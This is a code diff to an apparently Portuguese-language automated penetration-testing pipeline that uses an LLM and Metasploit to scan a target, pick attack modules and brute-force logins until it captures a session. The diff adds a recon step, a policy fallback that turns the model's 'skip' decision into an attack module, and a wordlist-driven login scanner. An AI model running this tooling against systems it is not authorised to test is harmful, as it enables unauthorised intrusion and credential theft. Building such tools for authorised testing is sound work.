@@ -19,6 +19,7 @@ from src.metasploit_client import MetasploitClient
 from src.llm_client import LLMClient
 from src.rag_engine import RagEngine
 from src.pipeline_common import PipelineBase, resolve_target
+from src import recon, wordlists, attack_policy
 
 # --- COLORS ---
 C_RED, C_GREEN, C_YELLOW, C_BLUE, C_RESET = "\033[91m", "\033[92m", "\033[93m", "\033[94m", "\033[0m"
@@ -213,14 +214,16 @@ class PentestPipeline(PipelineBase):
     def run(self):
         self.cleanup_sessions()
         print(f"\n>>> [FASE 1] RECONHECIMENTO")
-        ports = self.fast_python_scan()
-        if not ports: return
-        
+        rec = recon.scan(self.target_ip)
+        self.services = rec.get("ports", {})
+        print(f"    [*] Metodo de scan: {rec.get('method')}")
+        if not self.services:
+            print(f"{C_RED}[!] Nenhuma porta aberta encontrada.{C_RESET}")
+            return
         self.open_ports = {}
-        for p in ports:
-            b = self.get_service_banner(p)
-            self.open_ports[p] = b
-            print(f"    {C_GREEN}[+] Porta {p}: {b}{C_RESET}")
+        for p, info in sorted(self.services.items(), key=lambda x: int(x[0])):
+            self.open_ports[p] = info.get("banner", "")
+            print(f"    {C_GREEN}[+] Porta {p}: {info.get('banner','')}{C_RESET}")
 
         print(f"\n>>> [FASE 2] ANALISE DINAMICA (100% RAG DRIVEN)")
         wordlist_creds = self.load_credentials()
@@ -327,7 +330,15 @@ class PentestPipeline(PipelineBase):
             
             if resp: print(f"{C_BLUE}[AI] Decisao: {strategy.upper()} | Modulo: '{module}'{C_RESET}")
 
-            if strategy == "skip": continue
+            info = getattr(self, "services", {}).get(port, {"banner": banner})
+            pol = attack_policy.decide(info, wordlist_available=True)
+            if (not module) or strategy == "skip":
+                if pol["module_name"]:
+                    strategy = pol["strategy"]
+                    module = pol["module_name"]
+                    print(f"{C_YELLOW}[POLICY] {strategy.upper()} -> {module} ({pol['reason']}){C_RESET}")
+            if strategy == "skip" or not module:
+                continue
 
             if "login" in module or "credential" in module: strategy = "brute_force"
 
@@ -365,35 +376,27 @@ class PentestPipeline(PipelineBase):
                 print(f"\n{C_MAGENTA}>>> [FASE 3] EXPLORACAO ({strategy.upper()}){C_RESET}")
             
             if strategy == "brute_force":
-                if not wordlist_creds:
-                    print(f"{C_YELLOW}[SKIP] Sem wordlist.{C_RESET}")
+                wl = wordlists.resolve()
+                if not (wl["userpass_file"] or wl["pass_file"]):
+                    print(f"{C_YELLOW}[SKIP] Sem wordlist disponivel.{C_RESET}")
                     continue
-                print(f"{C_YELLOW}[*] Brute Force em {module}...{C_RESET}")
-                
-                opts["STOP_ON_SUCCESS"] = "true"
-                opts["BLANK_PASSWORDS"] = "false"
-                opts["USER_AS_PASS"] = "false"
-                opts["VERBOSE"] = "false"
-                
-                found = False
-                for user, pwd in wordlist_creds:
-                    opts["USERNAME"] = user
-                    opts["PASSWORD"] = pwd
-                    print(f"    Testing: {user}:{pwd}", end='\r') 
-                    try:
-                        self.msf.run_module(m_type, m_name, opts)
-                        time.sleep(2) 
-                        s = self.msf.client.call('session.list')
-                        if s:
-                            sid = str(max([int(k) for k in s.keys()]))
-                            if sid != self.session_id:
-                                print(f"\n{C_GREEN}[***] PWNED! Sessao {sid} ({user}:{pwd})!{C_RESET}")
-                                self.session_id = sid
-                                self.history.append(f"[SUCESSO] Porta {port} via {m_name}")
-                                found = True
-                                break
-                    except: pass
-                if not found: print(f"\n{C_RED}[FALHA] Credenciais invalidas.{C_RESET}")
+                print(f"{C_YELLOW}[*] Brute force (arquivo) em {m_name} | {wl['stats']}{C_RESET}")
+                before_sid = self._max_sid()
+                out = self.msf.run_login_scanner(m_name, opts,
+                                                 userpass_file=wl["userpass_file"],
+                                                 user_file=wl["user_file"],
+                                                 pass_file=wl["pass_file"]) or ""
+                creds = re.findall(r"(?:Success|Login Successful|succeeded)[^\n]*", out)
+                sid = self._max_sid()
+                if sid and sid != before_sid:
+                    self.session_id = sid
+                    self.history.append(f"[SUCESSO] Porta {port} via {m_name} (sessao {sid})")
+                    print(f"\n{C_GREEN}[***] PWNED! Sessao {sid} via {m_name}.{C_RESET}")
+                elif creds:
+                    self.history.append(f"[CRED] Porta {port} via {m_name}: {creds[:3]}")
+                    print(f"\n{C_GREEN}[+] Credenciais validas: {creds[:3]}{C_RESET}")
+                else:
+                    print(f"\n{C_RED}[FALHA] Nenhuma credencial valida na wordlist.{C_RESET}")
 
             elif strategy == "enumeration":
                 print(f"{C_YELLOW}[*] Executando Scanner (Run Once)...{C_RESET}")
